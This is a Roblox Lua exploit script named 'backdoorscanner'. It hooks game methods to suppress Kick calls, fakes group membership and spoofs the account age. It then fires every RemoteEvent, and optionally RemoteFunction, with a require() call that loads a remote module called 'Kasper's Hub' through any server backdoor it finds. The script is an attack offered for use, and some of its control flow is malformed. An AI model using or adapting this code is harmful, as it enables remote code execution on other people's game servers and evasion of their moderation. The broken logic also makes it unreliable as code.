--[[
backdoorscanner.lua
This will inject a Require Script to randomly find RemoteEvent/RemoteFunction that handles executing Require Scripts and fire Kasper's Hub inject it.
Bitwise#4908
]]
function Hook()
hook = hookmetamethod(game, "__namecall", function(a, b)
    if tostring(string.lower(getnamecallmethod())) == "Kick" then
        return nil
    end
    return hook(a, b)
end)
hook2 = hookmetamethod(game, "__namecall", function(a, b)
    if tostring(string.lower(getnamecallmethod())) == "IsInGroup" then
        return a
    end
    return hook(a, b)
end)
    hookfunction(game.Players.LocalPlayer:Kick(), function() return nil end)
    game.Players.LocalPlayer.AccountAge = math.random(500, 2000)
end
local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
local code = [[require(9039886698).tristytn(']]..game.Players.LocalPlayer.Name..[[')]] -- This will load the Kasper's Hub but if you know how to change this feel free to.
local blacklisted = {'emma','__FUNCTION'}
for i,v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") then
       for index, value in pairs(blacklisted) do
          if v.Name ~= value then
             Hook()
             v:FireServer(code)
          end
       end
if RemoteFunctionsEnabled then
    elseif v:IsA("RemoteFunction") then
         for index, value in pairs(blacklisted) do
             if v.Name ~= value then
                 Hook()
                 v:InvokeServer(code)
                 end
             end
         end
    end
end
